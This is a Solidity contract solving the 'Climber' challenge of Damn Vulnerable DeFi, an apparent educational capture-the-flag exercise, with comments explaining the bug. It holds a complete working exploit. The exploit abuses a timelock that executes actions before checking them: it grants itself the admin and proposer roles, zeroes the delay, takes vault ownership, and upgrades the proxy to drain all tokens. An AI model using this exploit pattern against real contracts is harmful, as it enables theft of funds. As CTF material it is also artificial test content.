// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import { IClimberVault } from "./Interfaces/IClimberVault.i.sol";
import { IClimberTimelock } from "./Interfaces/IClimberTimelock.i.sol";
import "./ClimberConstants.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BetterThanTenzingNorgay {
    address private player;
    address private sweeper;
    address private proposer;
    IClimberVault private vault;
    IClimberTimelock private timelock;
    IERC20 private token;

    uint256 private constant VAULT_TOKEN_BALANCE = 10000000 * 1e18;
    uint256 private constant PLAYER_INITIAL_ETH_BALANCE = 1e17;
    uint64 private constant TIMELOCK_DELAY = 60 * 60;

    constructor(address _sweeper, address _proposer, address _vault, address _token, address _player) payable {
        sweeper = _sweeper;
        proposer = _proposer;
        vault = IClimberVault(_vault);
        timelock = IClimberTimelock(payable(vault.owner()));
        token = IERC20(_token);
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // As always, make sure to transfer any tokens and ether back to the
        // player account. And as always, feel free to make and use extra
        // functions and/or contracts.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // The key to this challenge is a logic error in the way the vault
        // handles queued actions. The purpose of the set of contracts is to
        // be able to propose an action that then gets queued and executed
        // after some time has passed. It is a simple form of the "governance"
        // pattern used in many protocols.

        // However, in this case, they have made a serious mistake, which
        // allows an attacker to do virtually anything. That mistake is that
        // the proposed actions are executed *before* the scheduler is checked
        // to see if the actions are valid and scheduled. This underminds all
        // of the security guarantees of the contracts, most notably that only
        // a "proposer" can schedule an action to execute. Because the actions
        // are run prior to validation, we can make an action to give ourselves
        // the proposer role, and then "schedule" that action -- which we are
        // allowed to do because the action has been executed already!

        // So, to drain the contracts, we simply create all the actions we
        // want to perform, in the format accepted by the contracts, and then
        // run them with the execute() command. That will execute all the actions
        // first, and then "validate" them after they have already finished, by
        // which point it is too late. So we schedule all the actions necessary
        // to pass all the checks -- granting ourselves the proposer roll, and
        // setting the timelock delay to 0, and scheduling the acitons -- and
        // then our last action, once we are in complete control of the vault
        // contract, is to delegatecall our function below that transfers out
        // all the money. (The vault happens to be a proxy, so the actual action
        // is to perform an "upgrade" of the implementation contract, but the
        // idea is the same. The proxy doesn't have any delegatecall functionality
        // that we can explicitly call, so we have to change its implementation
        // contract to something that suits our needs.)

        // Let's get to it!

        // Arbitrary value we set to zero because we aren't using the victim
        // contract more than once. If we were, this would be essentially a
        // nonce. (This value is used in combination with the actions to execute
        // to create a unique hash to assign to the group of actions.)
        bytes32 salt = bytes32(uint256(0));

        address[] memory targets = new address[](5);
        bytes[] memory callDatas = new bytes[](5);
        uint256[] memory values = new uint256[](5);

        // First we remove the time delay, so that the scheduler's time validation passes
        targets[0] = address(timelock);
        callDatas[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        values[0] = 0;

        // Next we give ourselves the admin role, because why not
        targets[1] = address(timelock);
        callDatas[1] = abi.encodeWithSignature("grantRole(bytes32,address)", ADMIN_ROLE, address(this));
        values[1] = 0;

        // Also give ourself the proposer role, so we can schedule all of these actions
        targets[2] = address(timelock);
        callDatas[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        values[2] = 0;

        // Transfer vault ownership to us, so we can change the proxy implementation address
        targets[3] = address(vault);
        callDatas[3] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        values[3] = 0;

        // We can't use partial/indexed arrays, so we have to make new ones
        // for the next call to schedule the actions
        address[] memory targets2 = new address[](4);
        bytes[] memory callDatas2 = new bytes[](4);
        uint256[] memory values2 = new uint256[](4);
        for (uint256 i; i < 4; ++i) {
            targets2[i] = targets[i];
            callDatas2[i] = callDatas[i];
            values2[i] = values[i];
        }

        // Call our own schedule function to schedule the above actions, as
        // well as the schedule call itself. We can't perform the scheduling
        // here inside this function, because there would be a circular
        // dependency on the data arrays. (Notice the data passed to the
        //scheduler is arrays that contain everything *except* the scheduling
        // function call.)
        targets[4] = address(this);
        callDatas[4] = abi.encodeWithSignature(
            "scheduleActionsAndSelf(address[],bytes[],uint256[],uint256,bytes32)",
            targets2,
            callDatas2,
            values2,
            0,
            salt
        );
        values[4] = 0;

        // Run the above functions, which will execute them all before checking
        // the schedule, and since the calls schedule them and change the delay
        // to zero, they all should pass the checks that runs after the actions
        // finish.
        timelock.execute(targets, values, callDatas, salt);

        // Now that we own the vault, we can change the logic contract to be this
        // contract and delegatecall our own function which takes all the tokens.
        // (This breaks the vault completely since this contract does not imlement
        // any vault functionality, but the delegatecall to our token-stealing
        // function will work, which is all we care about.)
        vault.upgradeToAndCall(
            address(this),
            // The delegateCallSendTokens() is a function we define below.
            abi.encodeWithSignature("delegateCallSendTokens(address,address)", address(this), address(token))
        );

        // Now we just transfer everything to the player account and we're done!
        token.transfer(player, token.balanceOf(address(this)));
        player.call{ value: address(this).balance }("");

        // Walkthrough:
        // https://stermi.medium.com/damn-vulnerable-defi-challenge-12-solution-climber-48907c9fce0e

        // (All youtube videos I could find referenced Damn Vulnerable Defi v2,
        // not v3, so I have linked the medium article instead.)
    }

    // When delegate-called by the vault proxy, this will transfer all of its
    // tokens to the recipient. (Recipient and token address are parameters so
    // that this function doesn't rely on any state variables. If it used
    // state variables, nothing would work because this contract is not
    // remotely compatible with the ClimberVault functionality or state.)
    function delegateCallSendTokens(address recipient, address _token) public {
        IERC20(_token).transfer(recipient, IERC20(_token).balanceOf(address(this)));
    }

    // This function is a lie, since we're not actually a proxy, but all we care
    // about is passing the is-this-a-proxy check so that our delegateCallSendTokens()
    // function gets called.
    function proxiableUUID() external view returns (bytes32) {
        // The hard-coded official EIP1967 implementation slot
        // 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
        return bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    }

    // Schedule all the actions as well as the schedule action itself
    function scheduleActionsAndSelf(
        address[] memory _targets,
        bytes[] memory _callDatas,
        uint256[] memory _values,
        uint256 value,
        bytes32 salt
    ) public {
        // Copy the input values into a new array that will also store the
        // schedule action
        address[] memory targets = new address[](_targets.length + 1);
        bytes[] memory callDatas = new bytes[](_targets.length + 1);
        uint256[] memory values = new uint256[](_targets.length + 1);
        for (uint256 i; i < _targets.length; ++i) {
            targets[i] = _targets[i];
            callDatas[i] = _callDatas[i];
            values[i] = _values[i];
        }
        targets[_targets.length] = address(this);
        callDatas[_targets.length] = abi.encodeWithSignature(
            "scheduleActionsAndSelf(address[],bytes[],uint256[],uint256,bytes32)",
            _targets,
            _callDatas,
            _values,
            value,
            salt
        );
        values[_targets.length] = value;

        timelock.schedule(targets, values, callDatas, salt);
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable {
        revert("I'm not a vault!!!");
    }

    fallback() external payable {
        revert("I'm not a vault!!!");
    }
}
